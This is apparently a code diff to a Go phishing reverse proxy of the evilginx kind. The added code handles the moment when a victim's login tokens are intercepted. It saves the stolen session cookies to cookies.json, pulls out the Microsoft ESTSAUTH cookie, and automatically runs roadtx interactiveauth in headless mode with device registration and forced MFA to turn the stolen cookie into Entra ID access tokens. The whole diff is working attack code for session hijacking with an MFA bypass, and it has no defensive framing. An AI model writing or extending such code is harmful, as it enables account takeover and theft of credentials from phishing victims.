@@ -92,6 +92,30 @@ type ProxySession struct {
 	Index        int
 }
 
+// Starting roadtx interactiveauth using the estscookie captured from the user authentication flow
+func roadtx_interactive_auth(cookie string) {
+	
+	venvDir := "/venv"
+	python := venvDir+"/bin/python3"
+	filename := fmt.Sprintf(".roadtools_auth_%d", time.Now().Unix())
+	log.Info("Starting interactiveauth to fetch auth token and save to %s", filename)
+	cmd := exec.Command(python, "-u", venvDir+"/bin/roadtx", "interactiveauth", "--headless", "-c", "msbroker", "-r", "devicereg", "--estscookie", cookie, "--force-mfa", "--tokenfile", filename)
+	cmd.Stdout = os.Stdout
+    cmd.Stderr = os.Stderr
+
+    if err := cmd.Start(); err != nil {
+        log.Fatal("Start: %v", err)
+    }
+
+    go func() {
+        if err := cmd.Wait(); err != nil {
+            log.Printf("python exited with error: %v", err)
+        } else {
+            log.Printf("python exited normally")
+        }
+    }()
+}
+
 // set the value of the specified key in the JSON body
 func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error) {
 	var data map[string]interface{}
@@ -1200,6 +1224,32 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 							if err == nil {
 								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
+								if len(s.CookieTokens) > 0 {
+									var t Terminal
+									json_tokens := t.cookieTokensToJSON(s.CookieTokens)
+
+									// Save cookies to file on disk
+									err := os.WriteFile(
+										"cookies.json",
+										[]byte(fmt.Sprintf("{\"cookies\": %s}", json_tokens)),
+										0o644,
+									)
+
+									// roadtx command to get tokens
+									val, ok := findCookieValue(s.CookieTokens, "ESTSAUTH")
+									if !ok {
+										log.Printf("cookie ESTSAUTH not found")
+									}
+									if ok {
+										roadtx_interactive_auth(val)
+									}
+									if err == nil {
+										log.Info("Cookies written to cookies.json")
+									}
+									if err != nil {
+										log.Printf("failed to write cookies.json: %v", err)
+									}									
+								}
 							}
 
 							if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
